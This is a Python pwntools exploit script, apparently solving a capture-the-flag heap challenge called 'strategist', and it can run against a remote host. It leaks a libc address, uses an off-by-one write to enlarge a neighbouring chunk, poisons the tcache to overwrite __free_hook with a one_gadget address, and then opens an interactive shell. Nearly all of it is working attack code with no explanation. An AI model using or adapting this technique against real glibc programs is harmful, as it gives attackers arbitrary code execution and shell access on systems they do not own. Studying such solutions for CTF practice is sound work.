#!/usr/bin/env python3
from pwn import *

libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
b*create_plan+173
b*delete_plan+213
continue
'''.format(**locals())


exe = './strategist_patched' #change this
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

def create_plan(size, data):
    p.sendafter(b"> ", b"1")
    p.sendlineafter(b"plan?", f"{size}".encode())
    if(size > 0):
        p.sendafter(b"plan.", data)

def show_plan(index):
    p.sendafter(b"> ", b"2")
    p.sendlineafter(b"view?", f"{index}".encode())

def edit_plan(index, data):
    p.sendafter(b"> ", b"3")
    p.sendlineafter(b"change?", f"{index}".encode())
    p.sendafter(b"plan.", data)

def delete_plan(index):
    p.sendafter(b"> ", b"4")
    p.sendlineafter(b"delete?", f"{index}".encode())


p = start()
create_plan(0x508, b"A" * 8)
for i in range(3): # use later for tcache poisoning
    create_plan(0x10, f"{i}".encode() * 8)
delete_plan(0)
create_plan(0x508, b"A" * 8)
show_plan(0)
p.recvuntil(b"A" * 8)
libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x3ebca0
log.info(hex(libc_base))

# off by one -> change size of next chunk
delete_plan(0)
create_plan(0x508, b"A" * 0x508)
edit_plan(0, b"A" * 0x508 + p8(0x71))

# tcache poisoning
__free_hook = libc_base + libc.symbols['__free_hook']
one_shot = libc_base + 0x4f432

delete_plan(3)
delete_plan(2)
delete_plan(1)
create_plan(0x68, b"A" * 0x18 + p64(0x21) + p64(__free_hook)) # this chunk at index 1 and overlapping with 2 tcache bins
create_plan(0x10, b"A" * 8)
create_plan(0x10, p64(one_shot)) # this is __free_hook
delete_plan(0) # trigger 


p.interactive()